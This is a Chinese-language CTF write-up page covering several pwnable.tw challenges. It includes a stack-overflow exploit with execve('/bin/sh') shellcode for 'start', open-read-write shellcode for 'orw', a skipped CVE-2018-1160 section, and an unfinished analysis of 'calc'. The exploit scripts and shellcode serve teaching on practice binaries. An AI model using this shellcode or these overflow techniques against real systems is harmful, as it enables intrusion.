@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="信息安全,PWN,ret2shellcode,python," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x00.绪论pwnable.tw是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD 点开查看题解👇（当然也有可能我暂时还一题都没有做出来2333  注：原题皆可在本页面直接下载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF题解-0x02】pwnable.tw write up by arttnb3">
+<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="0x00.绪论pwnable.tw是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD 点开查看题解👇（当然也有可能我暂时还一题都没有做出来2333  注：原题皆可在本页面直接下载">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/DF5AuyjdxZCQq9J.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/31/KYd5sUBSI8ODAtF.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/akJelDmdMbQY7Sx.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/bOtr7Lpmfc5iP4T.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/5ntsIupzL7iwby1.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/cIRm4X3OU7rJFiN.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/9d3aRTn4jyFxQsD.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/01/PhLB26KCVqea5Zj.png">
+<meta property="article:published_time" content="2020-08-17T13:19:29.000Z">
+<meta property="article:modified_time" content="2020-09-19T11:47:51.088Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://archive.next.arttnba3.cn/2020/08/17/【CTF题解-0x02】pwnable-tw-write-up-by-arttnb3/"/>
+
+
+
+
+
+  <title>【CTF题解-0x02】pwnable.tw write up by arttnb3 | arttnba3's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/arttnba3" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">arttnba3's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">- arttnba3的隐秘小窝 -</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="arttnba3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="arttnba3's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【CTF题解-0x02】pwnable.tw write up by arttnb3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-17T21:19:29+08:00">
+                2020-08-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2020-09-19T19:47:51+08:00">
+                2020-09-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,552 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a href="https://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a>是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD</p>
+<p>点开查看题解👇（<del>当然也有可能我暂时还一题都没有做出来2333</del></p>
+<blockquote>
+<p>注：原题皆可在本页面直接下载</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01.start"></a>0x01.start</h1><blockquote>
+<p> nc chall.pwnable.tw 10000</p>
+</blockquote>
+<p><a href="/download/pwnabletw/start" title="点击此处下载原题">点击下载-start</a> </p>
+<p>惯例的<code>checksec</code>，发现保护全关，暗示可以为所欲为23333</p>
+<p><img src="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png" alt="image.png"></p>
+<p>拖入IDA进行分析，<del>直接傻眼，这都什么东西</del>，整个程序只有一个<code>_start</code>函数和一个<code>_exit</code>函数</p>
+<p><img src="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png" alt="image.png"></p>
+<p>简单分析一下，该程序首先将<code>esp的值</code>、<code>_exit函数的地址</code>以及一串字符串<code>let&#39;s start the CTF</code>压入栈中</p>
+<p>随后将esp的值传入ecx寄存器中，将0x14传入dl寄存器中，1传入bl寄存器中，4传入al寄存器中</p>
+<p><strong>之后<code>int 0x80</code>中断指令触发Linux系统调用，al寄存器的值作为参数，调用了0x80中断的系统函数<code>sys_write()</code>，将bl、dl、ecx的值作为参数传入，输出字符串</strong></p>
+<p><strong>随后将0x3c传入dl寄存器中，3传入al寄存器中，之后<code>int 0x80</code>中断指令触发Linux系统调用，al寄存器的值作为参数，调用了0x80中断的系统函数<code>sys_read()</code>，将bl、dl、ecx的值作为参数传入，读入最大0x3c个字节</strong></p>
+<p>最后返回到<code>_exit</code>函数，退出程序</p>
+<blockquote>
+<p>参见：<a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="noopener">linux系统调用</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png" alt="image.png"></p>
+<p>那么在这个过程当中，<strong><code>esp与栈</code>的变化如下</strong>（字丑勿怪2333（图上应该是5次push，手快写错了XDDD</p>
+<p><img src="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png" alt="image.png"></p>
+<p>通过使用中断的方式调用系统函数，我们不难猜的出这应该是一个纯汇编写的程序</p>
+<p>程序本身也没有其他多余的gadgets，在保护全关的情况下，我们可以考虑<strong>泄露esp的值，将shellcode输入到栈上，再控制程序跳转到栈上的shellcode以getshell</strong></p>
+<p>那么我们可以考虑先覆盖掉return address，控制其跳转至<code>0x8048087</code>，重新调用<code>sys_write()</code>输出栈上的内容，此时程序会将<code>原esp的值</code>输出出来</p>
+<p><img src="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png" alt="image.png"></p>
+<p>随后程序接着往下走，重新调用<code>sys_read()</code>，我们便可以在这里输入我们的第二段payload：<strong>20*’A’ + 通过泄露的esp的值计算出来的存放shellcode的栈地址 + shellcode</strong>，这段payload用以getshell</p>
+<p><img src="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png" alt="image.png"></p>
+<p>简单分析我们可以知道经过第一次输入后的跳转再经过第二次输入后，栈上<code>原esp+0x14-4</code>的位置即是程序控制的返回地址，我们只需要在此处写上<code>原esp+0x14</code>，紧接着后面跟着覆盖上我们的shellcode即可getshell，整个过程如下图</p>
+<p><img src="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png" alt="image.png"></p>
+<p>因为输入只有60个字节，故考虑使用11号中断调用execve(“/bin/sh”)来getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;&#x2F;bin&#x2F;sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs&#x2F;&#x2F;</span><br><span class="line">push 0x6e69622f   ;; nib&#x2F;</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>构造shellcode如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br></pre></td></tr></table></figure>
+
+<p>我们最后得到的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./start'</span>)<span class="comment">#p = remote('chall.pwnable.tw',10000)</span></span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x14</span> + (esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#本地不明原因一直跑不通x</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>连接，发送我们的payload，成功得到flag（👈因为网不好连着试了好几次才成功…</p>
+<p><img src="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png" alt="image.png"></p>
+<p>得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02.orw"></a>0x02.orw</h1><blockquote>
+<p>nc chall.pwnable.tw 10001</p>
+</blockquote>
+<p><a href="/download/pwnabletw/orw/orw" title="点击此处下载原题">点击下载-orw</a> </p>
+<p>首先可以看到题目对环境做出了一定的限制</p>
+<p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p>
+<p>惯例的<code>checksec</code>，发现只开了<code>canary</code></p>
+<p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p>
+<p>主程序一开始会先调用<code>orw_seccomp()</code>函数，我们点进去康康</p>
+<p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p>
+<p>v4是canary的值，我们现在还不知道是否需要绕过canary，故先不予理会</p>
+<p>接下来调用了<code>qmemcpy()</code>函数，实际上就是<code>memcpy</code>函数，将从0x8048640地址开始拷贝0x60字节的数据到v3中，随后赋值12给v1，v2作为指针获取v3的首字节地址</p>
+<p>最后调用<code>prctl()</code>函数，结合题目的说明，我们大致可以猜测到<code>orw_seccomp()</code>函数的作用应该是<strong>禁用其他的系统调用，仅开放sys_read、sys_write、sys_open</strong></p>
+<p>也就是说我们<strong>无法通过sys_execve来getshell</strong></p>
+<p>接下来回到主函数，我们很容易看出该程序会读入最大0xC8字节输入并尝试执行该输入</p>
+<p>结合题目说明，我们<strong>仅考虑构造shellcode来cat flag</strong></p>
+<p>（因为要绕过seccomp来getshell已经是kernel pwn 的级别le，233333）</p>
+<p>故构造exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode &#x3D; &quot;&quot;</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.pushstr(&quot;&#x2F;home&#x2F;orw&#x2F;flag&quot;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)</span><br><span class="line">p &#x3D; remote(&#39;chall.pwnable.tw&#39;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>向服务器发送我们的payload</p>
+<p><img src="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png" alt="_7__O90_E_I39_HGTFIP__S.png"></p>
+<p>成功得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-CVE-2018-1160（×）"><a href="#0x03-CVE-2018-1160（×）" class="headerlink" title="0x03.CVE-2018-1160（×）"></a>0x03.CVE-2018-1160（×）</h1><blockquote>
+<p>nc chall.pwnable.tw 10002</p>
+</blockquote>
+<p><a href="/download/pwnabletw/CVE-2018-1160/netatalk.tgz" title="点击此处下载原题">点击下载-netatalk.tgz</a> </p>
+<p><a href="/download/pwnabletw/CVE-2018-1160/libc.so" title="点击此处下载原题">点击下载-libc.so</a> </p>
+<blockquote>
+<p>首先我们先看看CVE是个啥：</p>
+<p> CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”通用漏洞披露。CVE就好像是一个字典表，为广泛认同的<a href="https://baike.baidu.com/item/信息安全/339810" target="_blank" rel="noopener">信息安全</a>漏洞或者已经暴露出来的弱点给出一个公共的<a href="https://baike.baidu.com/item/名称/6546057" target="_blank" rel="noopener">名称</a>。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估<a href="https://baike.baidu.com/item/工具/81891" target="_blank" rel="noopener">工具</a>中共享数据，虽然这些工具很难整合在一起。这样就使得CVE成为了安全信息共享的“<a href="https://baike.baidu.com/item/关键字/7105697" target="_blank" rel="noopener">关键字</a>”。如果在一个漏洞报告中<a href="https://baike.baidu.com/item/指明/633104" target="_blank" rel="noopener">指明</a>的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全<a href="https://baike.baidu.com/item/问题/1067365" target="_blank" rel="noopener">问题</a>。 </p>
+<p><a href="https://baike.baidu.com/item/CVE" target="_blank" rel="noopener">百度百科-CVE</a></p>
+</blockquote>
+<p>好家伙，第三题直接上<strong>CVE</strong>，<del>我直接当场暴毙做不出来跳过并进入下一题</del></p>
+<p>惯例的<code>checksec</code>，<strong>保 护 全 开</strong>（噔 噔 咚）</p>
+<p><img src="https://i.loli.net/2020/08/31/DF5AuyjdxZCQq9J.png" alt="2GP_TSHIRJ_~Z_GD6F_E@WQ.png"></p>
+<p>尝试动态调试，这软件太过古老直接跑不起来（悲）</p>
+<p>还是拖入IDA进行分析⑧</p>
+<blockquote>
+<p>咕了，找时间接着更（才不是因为看不懂几百行的main函数（👈菜🐓不请自爬））</p>
+</blockquote>
+<h1 id="0x04-calc"><a href="#0x04-calc" class="headerlink" title="0x04.calc"></a>0x04.calc</h1><blockquote>
+<p>nc chall.pwnable.tw 10003</p>
+</blockquote>
+<p><a href="/download/pwnabletw/calc/calc" title="点击此处下载原题">点击下载-calc</a> </p>
+<p>首先是惯例的<code>checksec</code>，可以看到开了canary保护和栈不可执行保护</p>
+<p><img src="https://i.loli.net/2020/08/31/KYd5sUBSI8ODAtF.png" alt="image.png"></p>
+<p>运行程序我们可以发现这是一个简单的计算器，遇到非法输入会报错、给出错误结果甚至直接退出</p>
+<p><img src="https://i.loli.net/2020/09/01/akJelDmdMbQY7Sx.png" alt="image.png"></p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/09/01/bOtr7Lpmfc5iP4T.png" alt="image.png"></p>
+<p>结合之前的运行结果，我们容易看出该程序中比较关键的就是<code>calc()</code>函数，进去康康</p>
+<p><img src="https://i.loli.net/2020/09/01/5ntsIupzL7iwby1.png" alt="image.png"></p>
+<p>开头<code>bzero()</code>函数将s上的0x400字节大小的空间全都置为0，随后进入<code>get_exp()</code>函数，我们再跟过去康康</p>
+<p><img src="https://i.loli.net/2020/09/01/cIRm4X3OU7rJFiN.png" alt="image.png"></p>
+<p>我们不难看出该函数的作用便是从输入中<strong>仅读取加减乘除求模运算符与字符0~9</strong>，不合规的输入都会被跳过，读到EOF或换行符会终止，同时最大读入a2个字节，这些输入会被写到a1上</p>
+<p>也就是说该函数的作用便是<strong>读取最大1024个字节的合法输入到s上</strong>，若不存在合法输入，返回的数据则为0，使calc的循环中断，程序结束。</p>
+<p>接下来是<code>init_pool()</code>函数</p>
+<p><img src="https://i.loli.net/2020/09/01/9d3aRTn4jyFxQsD.png" alt="image.png"></p>
+<p>不难看出作用是将a1（calc函数中的v1）上的100个字节赋值0</p>
+<p>接下来就是最关键的<code>parse_expr()</code>函数了，就流程而言漏洞很有可能就在这里（<del>要命的是这个函数很tm长，不禁感慨pwn对逆向基础的要求也不低</del></p>
+<p><img src="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png" alt="image.png"></p>
+<p>一开始<code>bzero()</code>将s上的100个字节置0，随后对a1上的字符（也就是先前读入的合法的表达式）逐字符进行判断</p>
+<p><img src="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png" alt="image.png"></p>
+<p>随后，<strong>首先判断是否为+-*/%</strong>等运算符号，因为强制类型转换将a1+i上的值转为<strong>unsigned int</strong>，若是’0’~’9’则肯定会≤9，<strong>若是运算符号，其减去48所得的值小于0，强制类型转换变成unsigned int后会变成一个极大的正整数（必定大于9）</strong></p>
+<blockquote>
+<p>注：这个语句我曾经一直以为是废语句Or2</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png" alt="image.png"></p>
+<p>随后将该字符前面的<code>i+a1-v5</code>个字符（v5用作可移动索引）用memcpy拷贝至s1中，末尾置’\0’成为字符串，并判断s1是否为”0”，若为0则退出运算</p>
+<p><img src="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png" alt="image.png"></p>
+<p>随后使用atoi将s1转为整数存入v9中，若v9不为0，则将<em>a2[0]+1赋给v4，随后将v9赋给a2[v4+1]，由此我们可以知道*</em>a[0]保存的是已经储存的数字的个数**</p>
+<p>接下来判断我们先前判断的那一个运算符字符的下一个字符是否存在且是否不为运算符（即是否会出现++这样的情况），若是则直接退出运算</p>
+<p><img src="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png" alt="image.png"></p>
+<p>接下来首先判断s[v7]是否为0，为0则将运算符存入s[v7]中，由此我们可以知道字符数组s是专门用来储存操作符的</p>
+<p>若s[v7]不为0（即代表先前已经储存了操作符），则分情况判断，若a1+i上的操作符为*/%则对s[v7]进行判断，判断其是否为+或-，由此我们可以看出这应该是一个针对运算符优先级的判断</p>
+<p>若s[v7]的优先级低于a1+i，则进入eval函数，之后将a1+i上的操作符赋给s[v7]，eval传入的参数为a2与s[v7]，同时我们知道a2数组中储存的是需要被我们运算的数</p>
+<p>优先级相同且都为高优先级则将操作符再压入栈中，随后回到循环开头</p>
+<p>a1+i为低优先级（加与减）时则进入eval函数，先对s[v7]进行运算，之后s[v7]出栈再将a1+i入栈</p>
+<p>若遇到字符串结尾则跳出循环</p>
